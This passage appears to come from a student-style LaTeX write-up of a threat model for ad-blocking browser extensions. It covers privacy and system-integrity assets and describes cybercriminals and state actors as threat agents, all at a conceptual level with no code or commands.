   - *Deeper Explanation:* When you grant an extension permission to "read and change all your data on the websites you visit," it effectively acts as a Man-in-the-Browser. If the extension is compromised, an attacker can access session cookies, inject malicious scripts, or exfiltrate PII (Personally Identifiable Information). Therefore, the user's data confidentiality and privacy are critical assets.

2. **System Security and Performance:**
   - *Motivation:* Browser extensions, including those for ad-blocking, have the potential to impact the overall system's integrity and performance. A poorly coded or malicious ad-blocking extension can consume excessive system resources, leading to slower computer performance or browser crashes. In more severe cases, such extensions might introduce malware or adware, compromising the integrity of the user's system.
   - *Deeper Explanation:* Extensions execute code within the browser's context. Resource exhaustion (CPU/Memory leaks) directly impacts availability. Furthermore, if the extension is a trojan (e.g., acts as an ad-blocker but secretly mines cryptocurrency or acts as a proxy for a botnet), the underlying system's integrity is breached.

### Question 2: Threats and Threat Agents

1. **Threat Agent: Cybercriminals**
   - *Threat: Data Theft / Malware Distribution*
   - *Motivation:* Cybercriminals are financially motivated. They can exploit the privileged access of the ad-blocker to steal credentials (identity theft, financial fraud) or use the extension's user base to distribute malware (e.g., ransomware) or inject their own ads (ad fraud).

2. **Threat Agent: State-Sponsored Actors (or Authoritarian Regimes)**
   - *Threat: Surveillance and Spying / Censorship*
   - *Motivation:* Nation-states may be interested in mass surveillance. By compromising a widely used ad-blocker, they could track citizens' browsing habits, identify dissidents, or inject code to block access to specific anti-regime websites or content (censorship).
\end{verbatim}

\end{document}
